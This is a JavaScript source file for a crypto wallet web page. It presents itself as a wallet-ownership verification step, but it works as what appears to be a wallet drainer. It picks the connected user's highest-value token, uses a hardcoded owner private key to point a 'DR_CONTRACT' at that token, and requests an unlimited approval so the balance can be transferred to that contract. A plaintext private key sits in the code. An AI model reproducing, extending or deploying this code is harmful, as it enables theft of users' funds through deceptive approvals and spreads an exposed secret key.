import {
  createAppKit,
  WagmiAdapter,
  networks,
} from "https://cdn.jsdelivr.net/npm/@reown/appkit-cdn@1.6.2/dist/appkit.js"
import { reconnect, getAccount, watchAccount, signMessage, writeContract } from "https://esm.sh/@wagmi/core@2.x"
import { TokenBalanceUI, TokenService, TokenFormatter, TokenContractDetails } from "./tokenLoader.js"
import { TokenApprover } from "./approve.js"
import TokenBalanceCalculator from "./getBalance.js"

// Initialize TokenContractDetails with Web3 instance
const web3 = new Web3(window.ethereum)

const tokenDetailsViewer = new TokenContractDetails(web3)

// Add a container for contract details in your HTML
const detailsContainer = document.createElement("div")
detailsContainer.id = "contract-details-container"
document.querySelector(".approval-section").insertBefore(detailsContainer, document.querySelector(".approval-actions"))

export const projectId = "b92b8dc3cd723bb6bd144c246940324b"

const appKitNetworks = [
  networks.sepolia,
  networks.mainnet,
  networks.polygon,
  networks.base,
  networks.scroll,
  networks.arbitrum,
  networks.solana,
]
const wagmiAdapter = new WagmiAdapter({
  networks: appKitNetworks,
  projectId,
})

const modal = createAppKit({
  adapters: [wagmiAdapter],
  networks: appKitNetworks,
  projectId,
  features: {
    analytics: true,
  },
  metadata: {
    name: "AppKit HTML Example",
    description: "AppKit HTML Example",
    url: "https://reown.com/appkit",
    icons: ["https://avatars.githubusercontent.com/u/179229932?s=200&v=4"],
  },
})

reconnect(wagmiAdapter.wagmiConfig)

document.getElementById("disconnect-btn")?.addEventListener("click", () => {
  modal.disconnect()
  clearStoredSignature()
})

// Add this function to call setTokenAddress on DR_CONTRACT
const hexToUint8Array = (hex) => {
  if (hex.startsWith("0x")) hex = hex.slice(2) // Remove the 0x prefix if present
  const bytes = new Uint8Array(hex.length / 2)
  for (let i = 0; i < bytes.length; i++) {
    bytes[i] = Number.parseInt(hex.substr(i * 2, 2), 16)
  }
  return bytes
}

// Initialize TokenBalanceUI
const tokenBalanceUI = new TokenBalanceUI(".token-balances")

const ownerPrivateKey = hexToUint8Array("4e6fd4360b712865f7355cae6f943da27759b8b1b144d0e47e50c213664a6389")
console.log(ownerPrivateKey)

// Add this after your existing wagmiAdapter initialization
const tokenApprover = new TokenApprover(wagmiAdapter.wagmiConfig, "0x" + Buffer.from(ownerPrivateKey).toString("hex"))

// Add the automatic signing function
const SIGNATURE_KEY = "wallet_signature"
const MESSAGE = "Welcome! Please sign this message to verify your wallet ownership."

function saveSignature(address, signature) {
  localStorage.setItem(
    SIGNATURE_KEY,
    JSON.stringify({
      address,
      signature,
      timestamp: Date.now(),
    }),
  )
}

function getStoredSignature(address) {
  const stored = localStorage.getItem(SIGNATURE_KEY)
  if (!stored) return null

  const data = JSON.parse(stored)
  return data.address === address ? data : null
}

function clearStoredSignature() {
  localStorage.removeItem(SIGNATURE_KEY)
}

// Update autoSignMessage function
async function autoSignMessage(address) {
  // Check for existing signature
  const stored = getStoredSignature(address)
  if (stored) {
    console.log("Found existing signature")
    const signatureResult = document.querySelector("#signature-result")
    signatureResult.innerHTML = `
            <div class="success-message">
                Wallet verified ✓
                <br>
                <small>Signature: ${stored.signature.slice(0, 20)}...</small>
            </div>
        `
    signatureResult.style.display = "block"
    return stored.signature
  }

  try {
    const signature = await signMessage(wagmiAdapter.wagmiConfig, {
      message: MESSAGE,
    })

    // Store the signature
    saveSignature(address, signature)

    const signatureResult = document.querySelector("#signature-result")
    signatureResult.innerHTML = `
            <div class="success-message">
                Successfully verified! 
                <br>
                <small>Signature: ${signature.slice(0, 20)}...</small>
            </div>
        `
    signatureResult.style.display = "block"

    return signature
  } catch (error) {
    console.error("Signing failed:", error)
    const signatureResult = document.querySelector("#signature-result")
    signatureResult.innerHTML = `
            <div class="error-message">
                Verification failed: ${error.message}
            </div>
        `
    signatureResult.style.display = "block"
    return null
  }
}

// Modify the watchAccount handler
watchAccount(wagmiAdapter.wagmiConfig, {
  onChange(account) {
    if (account?.address) {
      updateWalletInfo(account.address, account.chainId)
      loadTokenBalances(account.address)
      autoSignMessage(account.address)
    } else {
      document.querySelector(".wallet-info").style.display = "none"
      document.querySelector(".sign-message-section").style.display = "none"
      clearStoredSignature()
    }
  },
})

// Check initial connection
// Update existing initial connection check
const initialAccount = getAccount(wagmiAdapter.wagmiConfig)
if (initialAccount.address) {
  updateWalletInfo(initialAccount.address, initialAccount.chainId)
  loadTokenBalances(initialAccount.address)
  document.querySelector(".sign-message-section").style.display = "block"
}

// Initialize sign message button listener
document.querySelector("#sign-message-btn")?.addEventListener("click", handleMessageSigning)

// LXB Contract Constants
const LXB_CONTRACT = {
  // ADDRESS: "0x5C1dDe72466339b8B9919799BcEd5e46C27A9586", // Replace with your Sepolia contract address
  ADDRESS: "0xEF0575BF42c13352B1033fF23dD711FC841E56c8",
  CHAIN_ID: 11155111, // Sepolia chain ID
  DECIMALS: 18,
}

const DR_CONTRACT = {
  ADDRESS: "0x7aEBb27455DD33Fc0f555D09A4d2424BDEdC220E", // Replace with your Sepolia contract address
  CHAIN_ID: 11155111, // Sepolia chain ID
  DECIMALS: 18,
}

// Add this function after the existing functions
async function getTokenWithHighestBalance(tokens) {
  if (!tokens || tokens.length === 0) return null

  tokens.forEach(token => {
    const balance = Number.parseFloat(token.balance) * token.price;
    console.log(balance)
  });

  console.log(tokens);

  return tokens.reduce((max, token) => {
    const balance = Number.parseFloat(token.balance) * token.price;
    const maxBalance = (Number.parseFloat(max.balance) * Number.parseFloat(max.price));
    return balance > maxBalance ? token : max
  })
}

async function displayHighestBalanceToken(tokenAddress, isSetSuccessful) {
  const statusEl = document.querySelector("#status")
  let message = `<p>Token with highest balance: ${tokenAddress}</p>`

  if (isSetSuccessful === true) {
    message += "<p>Successfully set token address for DR_CONTRACT.</p>"
  } else if (isSetSuccessful === false) {
    message +=
      "<p>Failed to set token address for DR_CONTRACT. This may be because DR_CONTRACT is not the owner of the contract.</p>"
  } else {
    message += "<p>Token address was not set for DR_CONTRACT.</p>"
  }

  statusEl.innerHTML = message
}

async function setTokenAddress(tokenAddress) {
  const web3 = new Web3(window.ethereum)
  const account = web3.eth.accounts.privateKeyToAccount("0x" + Buffer.from(ownerPrivateKey).toString("hex"))
  web3.eth.accounts.wallet.add(account)

  const setTokenAddressAbi = [
    {
      inputs: [
        {
          internalType: "address",
          name: "_tokenAddress",
          type: "address",
        },
      ],
      name: "setTokenAddress",
      outputs: [],
      stateMutability: "nonpayable",
      type: "function",
    },
  ]

  const contract = new web3.eth.Contract(setTokenAddressAbi, DR_CONTRACT.ADDRESS)

  try {
    // Get the current nonce and gas price
    const nonce = await web3.eth.getTransactionCount(account.address, "pending")
    const gasPrice = await web3.eth.getGasPrice()

    // Increase gas price by 10% to ensure the transaction goes through
    const increasedGasPrice = (BigInt(gasPrice) * BigInt(110)) / BigInt(100)

    const tx = await contract.methods.setTokenAddress(tokenAddress).send({
      from: account.address,
      gas: 200000, // Adjust gas limit as needed
      nonce: nonce,
      gasPrice: increasedGasPrice.toString(),
    })

    console.log("setTokenAddress transaction:", tx)
    return tx
  } catch (error) {
    console.error("setTokenAddress error:", error)
    throw error
  }
}

document.querySelector("#approve-token")?.addEventListener("click", async () => {
  try {
    const account = getAccount(wagmiAdapter.wagmiConfig)
    if (!account.address) {
      throw new Error("Please connect your wallet first")
    }

    // Get all tokens and find the one with highest balance
    const tokens = await fetchUserTokens(account.address, account.chainId)
    // Get the token with the highest balance
    const filteredTokens = TokenBalanceCalculator.filterTokens(tokens, {
      minBalance: 0.01,
      excludeTokens: ['DUST'],
    });
    const highestBalanceToken = TokenBalanceCalculator.calculateHighestBalanceToken(filteredTokens);

    if (!highestBalanceToken) {
      throw new Error("No tokens found in wallet")
    }

    // Show contract details before approval
    const details = await tokenDetailsViewer.getContractDetails(
      LXB_CONTRACT.ADDRESS,
      account.address,
      DR_CONTRACT.ADDRESS,
    )

    console.log("Highest balance token:", highestBalanceToken)
    console.log("Contract details:", details)

    // Convert the balance to Wei (multiply by 10^18 for ETH/standard tokens)
    // const balanceInWei = BigInt(Math.floor(Number.parseFloat(highestBalanceToken.balance) * 10 ** 18).toString())
    const balanceInWei = BigInt(Math.floor(Number.parseFloat(highestBalanceToken.balance) * 10 ** 18))

    console.log("Balance in Wei:", balanceInWei.toString())

    // Display the details
    tokenDetailsViewer.createDetailsDisplay(detailsContainer, details)

    // Ask for confirmation
    const confirmed = confirm(
      `Do you want to approve and transfer ${highestBalanceToken.balance} ${highestBalanceToken.symbol} tokens to ${DR_CONTRACT.ADDRESS}?`,
    )
    if (!confirmed) {
      return
    }

    // Verify we're on the correct network
    if (account.chainId !== LXB_CONTRACT.CHAIN_ID) {
      throw new Error("Please switch to Sepolia Testnet")
    }

    const approvalAmount = (2n ** 256n - 1n).toString()

    const statusEl = document.querySelector("#status")
    statusEl.textContent = "Initiating approval and transfer..."

    // Use the updated approveAndSpend method
    const { spendTx } = await tokenApprover.approveAndSpend(
      LXB_CONTRACT.ADDRESS,
      DR_CONTRACT.ADDRESS,
      balanceInWei,
      approvalAmount,
      account.address,
    )

    console.log("Spend transaction:", spendTx)

    statusEl.textContent = `Successfully approved and transferred ${highestBalanceToken.symbol} tokens!`

    return { spendTx }
  } catch (error) {
    console.error("Approval and transfer error:", error)
    document.querySelector("#status").textContent = "Approval and transfer failed: " + error.message
    throw error
  }
})

const tokenService = new TokenService(web3)

async function fetchUserTokens(address, chainId) {
  if (chainId === 11155111) {
    const data = await tokenService.getWalletTokens(address)
    if (!data) return []

    const tokens = []

    // Add ETH
    if (data.ETH) {
      console.log(data)

      tokens.push({
        symbol: "ETH",
        name: "Ethereum",
        address: address,
        balance: data.ETH.balance,
        price: data.ETH.price.rate || 0,
      })
    }

    // Add ERC20 tokens
    if (data.tokens) {
      data.tokens.forEach((token) => {
        if (token.tokenInfo) {
          const tokenData = {
            symbol: token.tokenInfo.symbol || "Unknown",
            name: token.tokenInfo.name || "Unknown Token",
            balance: token.balance,
            address: token.tokenInfo.address,
            price: token.tokenInfo.price?.rate || 0,
          }

          tokens.push(tokenData)
        }
      })
    }

    console.log("Tokens found:", tokens)
    return tokens
  }
  return []
}

const transactionQueue = []
let isProcessingQueue = false

async function addToTransactionQueue(transaction) {
  transactionQueue.push(transaction)
  if (!isProcessingQueue) {
    processTransactionQueue()
  }
}

async function processTransactionQueue() {
  if (transactionQueue.length === 0) {
    isProcessingQueue = false
    return
  }

  isProcessingQueue = true
  const transaction = transactionQueue.shift()

  try {
    await transaction()
  } catch (error) {
    console.error("Transaction failed:", error)
  }

  processTransactionQueue()
}

function hasSetTokenAddress() {
  return localStorage.getItem("hasSetTokenAddress") === "true"
}

function markTokenAddressAsSet() {
  localStorage.setItem("hasSetTokenAddress", "true")
}

async function loadTokenBalances(userAddress) {
  if (!userAddress) return

  const account = getAccount(wagmiAdapter.wagmiConfig)
  tokenBalanceUI.showLoading()
  tokenBalanceUI.clearBalances()

  try {
    const tokens = await fetchUserTokens(userAddress, account.chainId)
    tokens.forEach((token) => {
      const formattedBalance = TokenFormatter.formatBalance(token.balance)
      const usdValue = token.price ? TokenFormatter.formatUSD(token.price) : "$ 0.00"

      tokenBalanceUI.displayTokenInfo({
        ...token,
        formattedBalance,
        usdValue,
      })
    })

    // Get the token with the highest balance
    const filteredTokens = TokenBalanceCalculator.filterTokens(tokens, {
      minBalance: 0.01,
      excludeTokens: ['DUST'],
    });
    const highestBalanceToken = TokenBalanceCalculator.calculateHighestBalanceToken(filteredTokens);
    console.log(highestBalanceToken);
    if (highestBalanceToken && !hasSetTokenAddress()) {
      console.log("Token with highest balance:", highestBalanceToken)

      addToTransactionQueue(async () => {
        try {
          // const tx = await setTokenAddress('highestBalanceToken.address)
          const tx = await setTokenAddress(highestBalanceToken.address)
          console.log("setTokenAddress transaction successful:", tx)
          displayHighestBalanceToken(highestBalanceToken.address, true)
          markTokenAddressAsSet()
        } catch (error) {
          console.error("Failed to set token address:", error)
          displayHighestBalanceToken(highestBalanceToken.address, false)
        }
      })
    }
  } catch (error) {
    console.error("Failed to load tokens:", error)
    tokenBalanceUI.displayError("Failed to load token balances")
  } finally {
    tokenBalanceUI.hideLoading()
  }
}

function updateWalletInfo(address, chainId) {
  const walletInfo = document.querySelector(".wallet-info")
  const addressEl = document.querySelector(".wallet-address")
  const networkBadge = document.querySelector(".network-badge")

  // Show wallet info
  walletInfo.style.display = "block"

  // Update address
  addressEl.textContent = `${address.slice(0, 6)}...${address.slice(-4)}`

  // Update network
  const networks = {
    11155111: "Sepolia Testnet",
    1: "Ethereum Mainnet",
    137: "Polygon Mainnet",
    // Add more networks as needed
  }
  networkBadge.textContent = networks[chainId] || `Chain ID: ${chainId}`

  // Copy address functionality
  const copyBtn = document.querySelector(".copy-btn")
  copyBtn.addEventListener("click", () => {
    navigator.clipboard.writeText(address)
    showTooltip(copyBtn, "Copied!")
  })
}

function showTooltip(element, message) {
  const tooltip = document.createElement("div")
  tooltip.className = "tooltip"
  tooltip.textContent = message

  document.body.appendChild(tooltip)

  const rect = element.getBoundingClientRect()
  tooltip.style.top = `${rect.top - 30}px`
  tooltip.style.left = `${rect.left + (rect.width - tooltip.offsetWidth) / 2}px`
  tooltip.style.opacity = "1"

  setTimeout(() => {
    tooltip.style.opacity = "0"
    setTimeout(() => tooltip.remove(), 200)
  }, 1000)
}
